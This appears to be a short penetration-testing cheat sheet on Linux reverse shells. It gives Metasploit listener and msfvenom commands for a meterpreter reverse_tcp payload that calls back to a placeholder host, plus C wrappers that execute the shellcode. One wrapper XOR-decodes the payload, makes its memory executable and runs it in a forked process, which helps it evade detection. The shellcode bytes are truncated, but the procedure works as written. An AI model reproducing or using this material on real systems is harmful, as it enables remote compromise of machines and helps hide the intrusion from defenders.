# Shells



### Basic Linux Reverse Shell

Configure Listener

```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.X.Y; set LPORT 443; exploit -j"
```

* Configure a payload

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=443 LHOST=192.168.X.Y -f c
```

* Create a wrapper called hack.c

hack.c

```
#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h>  

// msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=443 LHOST=192.168.X.Y -f c  
unsigned char buf[] ="\x48\x31"  
  
int main (int argc, char **argv)  
{  
 // Run our shellcode  
 int (*ret)() = (int(*)())buf;  
 ret();  
}
```

Compile the code with gcc

```
gcc -o hack.out hack.c -z execstack
```

### Encrypted Linux Reverse Shell

```
#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// compile with - gcc -o final.out encoded.c -z execstack
// msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=443 LHOST=192.168.X.Y -f c   -encrypt xor -encrypt-key J

unsigned char buf[] = "\x02\x7b\xb5\x20\x43\x12\xd3....";

int main(int argc, char** argv)
{
    if (fork() == 0)
    {
    char xor_key = 'J';
	int arraysize = (int)sizeof(buf);
	for (int i = 0; i < arraysize - 1; i++)
	{
		buf[i] = buf[i] ^ xor_key;
	}

    intptr_t pagesize = sysconf(_SC_PAGESIZE);
    if (mprotect((void*)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ | PROT_EXEC))
		{
            perror("mprotect");
            return -1;
        }
    int (*ret)() = (int(*)())buf;
    ret();
    }
    else
    {
        printf("done");
    }
    return 3;
}

```
